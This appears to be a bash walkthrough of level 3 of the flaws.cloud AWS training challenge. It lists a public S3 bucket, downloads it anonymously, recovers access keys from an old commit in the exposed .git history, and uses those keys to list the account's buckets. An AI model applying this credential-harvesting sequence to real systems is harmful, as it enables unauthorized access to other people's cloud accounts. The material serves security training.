#!/bin/bash
# http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud

aws s3 --profile default ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/
:'PRE .git/
2017-02-27 00:14:33     123637 authenticated_users.png
2017-02-27 00:14:34       1552 hint1.html
2017-02-27 00:14:34       1426 hint2.html
2017-02-27 00:14:35       1247 hint3.html
2017-02-27 00:14:33       1035 hint4.html
2020-05-22 19:21:10       1861 index.html
2017-02-27 00:14:33         26 robots.txt'

aws s3 --profile default ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/
:'PRE hooks/
                           PRE info/
                           PRE logs/
                           PRE objects/
                           PRE refs/
2017-09-17 16:12:24         52 COMMIT_EDITMSG
2017-09-17 16:12:24         23 HEAD
2017-09-17 16:12:24        130 config
2017-09-17 16:12:24         73 description
2017-09-17 16:12:24        600 index'

aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ . --no-sign-request --region us-west-2

# found access_keys.txt from git repo from old commit 

git log
: 'commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (HEAD -> master)
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:43 2017 -0600

    Oops, accidentally added something I shouldnt have

commit f52ec03b227ea6094b04e43f475fb0126edb5a61
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:07 2017 -0600

first commit'

git checkout f52ec03b227ea6094b04e43f475fb0126edb5a61

code ./access_keys.txt

aws configure --profile flaws
# put in the keys found above here :) 

aws s3 ls --profile flaws
: '
2020-06-25 18:43:56 2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud
2020-06-27 00:06:07 config-bucket-975426262029
2020-06-27 11:46:15 flaws-logs
2020-06-27 11:46:15 flaws.cloud
2020-06-27 16:27:14 level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
2020-06-27 16:27:14 level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
2020-06-27 16:27:14 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
2020-06-27 16:27:15 level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud
2020-06-27 16:27:15 level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
2020-06-28 03:29:47 theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud
'